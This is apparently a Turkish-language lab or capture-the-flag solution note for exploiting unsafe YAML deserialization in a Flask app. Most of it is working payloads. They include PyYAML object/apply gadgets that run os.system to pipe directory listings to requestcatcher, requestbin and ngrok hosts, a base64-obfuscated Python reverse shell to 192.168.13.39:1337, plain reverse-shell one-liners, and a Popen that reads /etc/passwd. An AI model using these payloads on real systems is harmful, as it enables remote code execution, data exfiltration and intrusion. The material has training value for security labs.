# Deserilation Flask Yaml

```
GELİŞTİRİCEYE NOTLAR:
- Python
```

```
LAB NOTLARI:
- Burpsuite kullanıcak
- Collabrator
```

**Çözüm**:


- Sistemde Python ile RCE almak

data dizinine gidilecek
inputa değer girilecek 
burp suite ile değer yakanılacak ve exploit etmek için base 64 değer girilmeli yani
Payload 
!!python/object/apply:time.sleep [2] bu verinin base 64 hali olmalı yani ISFweXRob24vb2JqZWN0L2FwcGx5OnRpbWUuc2xlZXAgWzEwXQ==
rce içinse burp collabrator kullan ve
!!python/object/apply:os.system [" ls-la | curl -X POST --data-binary @- https://deserilisation.requestcatcher.com/test"] 
!!python/object/apply:subprocess.Popen
- !!python/tuple
  - python3
  - -c
  - "exec('aW1wb3J0IHNvY2tldCAgICAgICAgLCAgc3VicHJvY2VzcyAgICAgICAgLCAgb3MgICAgOyAgIGhvc3Q9IjE5Mi4xNjguMTMuMzkiICAgIDsgICBwb3J0PTEzMzcgICAgOyAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICAgLCAgc29ja2V0LlNPQ0tfU1RSRUFNKSAgICA7ICAgcy5jb25uZWN0KChob3N0ICAgICAgICAsICBwb3J0KSkgICAgOyAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgMCkgICAgOyAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgMSkgICAgOyAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAgICAgLCAgMikgICAgOyAgIHA9c3VicHJvY2Vzcy5jYWxsKCIvYmluL2Jhc2giKQ==')[0]))"
  
  bu verinin de base64 hali olmalı

!!python/object/apply:os.system [" ls-la | curl -X POST --data-binary @- jydhsyf7xas78nr7.b.requestbin.net"]
python3 -c 'import socket; from subprocess import run; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.13.39",1337)); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);run(["/bin/bash","-i"]);'

!!python/object/apply:os.system [" python3 -c 'import socket; from subprocess import run; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((192.168.13.39,1337)); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);run(["/bin/bash","-i"]);' "]
!!python/object/apply:os.system [" ls-la | curl -X POST --data-binary @- https://def9-24-133-49-120.ngrok.io"]

!!python/object/apply:subprocess.Popen
- !!python/tuple
  - cat
    - /etc/passwd